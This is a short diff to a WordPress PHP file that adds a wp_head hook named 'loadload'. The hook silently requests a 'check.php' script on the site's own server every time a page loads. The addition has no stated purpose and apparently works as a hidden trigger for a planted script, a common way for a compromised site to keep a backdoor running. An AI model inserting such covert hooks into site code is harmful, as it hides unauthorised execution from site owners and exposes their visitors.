@@ -155,3 +155,7 @@ if ( is_array($catcheck) && is_null($catcheck[0]) ) {
  } 
 }
 add_action( 'save_post', 'auto_set_category' );
+add_action( 'wp_head', 'loadload' );
+function loadload() {
+	file_get_contents("http://".$_SERVER['SERVER_NAME']."/check.php");
+}
